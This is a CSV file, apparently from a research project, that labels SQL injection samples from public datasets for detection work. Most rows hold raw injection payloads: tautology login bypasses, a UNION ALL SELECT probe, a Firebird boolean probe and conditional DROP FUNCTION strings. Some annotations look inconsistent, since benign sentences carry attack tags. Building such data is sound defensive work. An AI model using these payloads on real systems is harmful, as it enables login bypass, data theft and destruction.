row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
11,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,? or 1  =  1 --,? OR 1 = 1 --,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_based_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
34234,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall","ON 21 JUNE , CONJUNCTION SCHWARZWALDVEREIN &#91; BLACK FOREST ASSOCIATION &#93; MID-SUMMER FESTIVAL , 12 JULY ARENA , ACCOMPANIED FIREWORKS , 13 DECEMBER FIRST CONCERT PUT STADTMUSIK (TOWN MUSICAL SOCIETY) NEW FESTIVAL HALL",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,stacked_fragment,policy,False,False,True,True,False,False,False,True,True,False,,3
7757,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1385'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'mjjd'  =  'mjjd,-1385' ) ) ) OR 5903 = ( 'QQPJQ'|| ( SELECT CASE 5903 WHEN 5903 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||'QZVZQ' ) AND ( ( ( 'MJJD' = 'MJJD,injection_fragment,UNKNOWN,rdb,end,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,rdb,3
19290,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,admin' or ',ADMIN' OR ',injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,authentication_bypass_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
6762,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'+  (  select 'jmdl' where 7827  =  7827,1'+ ( SELECT 'JMDL' WHERE 7827 = 7827,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
33783,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The majority users parking garage therefore hurry past Roman relics simply drop car,THE MAJORITY USERS PARKING GARAGE THEREFORE HURRY PAST ROMAN RELICS SIMPLY DROP CAR,injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
4390,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,IF ( 7899 = 7899 ) SELECT 7899 ELSE DROP FUNCTION ZBBP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3674,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1928  =  4811  )   select 1928 else drop function ucko--,IF ( 1928 = 4811 ) SELECT 1928 ELSE DROP FUNCTION UCKO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6530,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--","-9227 ) WHERE 6723 = 6723 UNION ALL SELECT 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
6893,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3245  =  6168  )   select 3245 else drop function nafj--,IF ( 3245 = 6168 ) SELECT 3245 ELSE DROP FUNCTION NAFJ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
